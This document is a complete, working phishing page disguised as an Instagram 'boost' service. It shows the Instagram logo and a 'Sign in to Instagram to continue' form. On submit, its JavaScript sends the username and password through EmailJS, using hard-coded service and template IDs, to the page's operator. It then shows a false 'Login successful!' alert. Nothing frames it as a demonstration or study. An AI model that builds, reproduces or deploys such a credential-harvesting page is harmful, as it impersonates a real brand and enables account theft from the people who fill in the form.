<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Boost Your Instagram Now!</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6b48ff, #ff589e, #ffcc00);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, rgba(255, 255, 255, 0.25), transparent 70%);
      opacity: 0.8;
      animation: pulseGlow 10s ease-in-out infinite;
    }
    @keyframes pulseGlow {
      0%, 100% { opacity: 0.8; transform: scale(1); }
      50% { opacity: 0.5; transform: scale(1.1); }
    }
    .container {
      width: 420px;
      background: #fff;
      border-radius: 25px;
      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
      padding: 50px 40px;
      text-align: center;
      z-index: 1;
      animation: floatIn 0.8s ease-out;
      backdrop-filter: blur(5px);
      background: rgba(255, 255, 255, 0.95);
    }
    @keyframes floatIn {
      0% { opacity: 0; transform: translateY(30px) scale(0.95); }
      100% { opacity: 1; transform: translateY(0) scale(1); }
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 30px;
    }
    .logo {
      width: 60px;
      margin-right: 15px;
      filter: drop-shadow(0 3px 8px rgba(0, 0, 0, 0.15));
    }
    .title {
      font-size: 28px;
      font-weight: 700;
      color: #ff3366;
      text-shadow: 0 2px 6px rgba(255, 51, 102, 0.4);
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 25px;
      font-weight: 400;
    }
    .form-box {
      padding: 0 20px;
    }
    .input-field {
      width: 100%;
      padding: 16px;
      margin: 12px 0;
      border: none;
      border-radius: 12px;
      background: #f5f5f5;
      font-size: 15px;
      color: #333;
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
      transition: all 0.3s ease;
    }
    .input-field:focus {
      background: #fff;
      box-shadow: 0 0 12px rgba(255, 88, 158, 0.5);
      outline: none;
    }
    .input-field::placeholder {
      color: #bbb;
    }
    .continue-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, #6b48ff, #ff589e, #ffcc00);
      color: white;
      border: none;
      border-radius: 12px;
      font-weight: bold;
      font-size: 17px;
      cursor: pointer;
      margin-top: 20px;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }
    .continue-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 20px rgba(255, 88, 158, 0.6);
    }
    .continue-btn:disabled {
      background: #d0d0d0;
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }
    .note {
      font-size: 13px;
      color: #888;
      margin-top: 25px;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
      <h1 class="title">Boost Your Instagram Now!</h1>
    </div>
    <p class="subtitle">Sign in to Instagram to continue</p>
    <div class="form-box">
      <form id="continue-form" name="continue-form">
        <input type="text" name="username" id="username" class="input-field" placeholder="Username or Email" required>
        <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
        <button type="submit" class="continue-btn" id="continue-btn">Continue</button>
      </form>
    </div>
    <p class="note">Explore exclusive features with your account!</p>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("XI3MNWxgiq0cRWGRE"); // Your Public Key

    document.getElementById("continue-form").addEventListener("submit", function(event) {
      event.preventDefault();
      const continueBtn = document.getElementById("continue-btn");
      continueBtn.disabled = true;
      continueBtn.textContent = "Processing...";

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      emailjs.send("service_1jiaczt", "template_9lwlyaq", {
        username: username,
        password: password
      })
      .then(function(response) {
        alert("Login successful!");
        continueBtn.disabled = false;
        continueBtn.textContent = "Continue";
        document.getElementById("continue-form").reset();
      }, function(error) {
        alert("Failed to process. Please try again.");
        continueBtn.disabled = false;
        continueBtn.textContent = "Continue";
        console.log("EmailJS Error:", error);
      });
    });
  </script>
</body>
</html>
